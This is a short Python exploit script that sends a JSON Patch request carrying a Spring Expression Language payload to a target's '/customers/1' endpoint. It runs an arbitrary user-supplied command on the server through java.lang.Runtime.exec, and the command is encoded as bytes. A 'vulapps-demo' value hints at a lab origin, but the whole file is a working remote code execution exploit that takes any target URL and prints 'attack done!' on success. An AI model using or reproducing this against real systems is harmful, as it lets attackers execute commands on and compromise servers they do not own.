#-*- coding:utf-8 -*-
#!/usr/bin/env python
# coding:utf-8
# auther:xiaoZ

import requests
import json

target = input("请输入目标站点URL: ")
cmd = input("请输入需要执行的命令： ")
tmp = ''

for ch in cmd:
	tmp += str(ord(ch))+','

cmd = tmp[:-1]

data2 = [{ 
	"op": "replace", 
	"path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{"+cmd+"}))/lastName", 
	"value": "vulapps-demo" 
	}]

data2 = json.dumps(data2)

url2 = target + "/customers/1"
headers2 = {'Content-Type': 'application/json-patch+json'}
response2 = requests.patch(url=url2,headers=headers2,data=data2)
if response2.status_code == 400:
	print("attack done!")
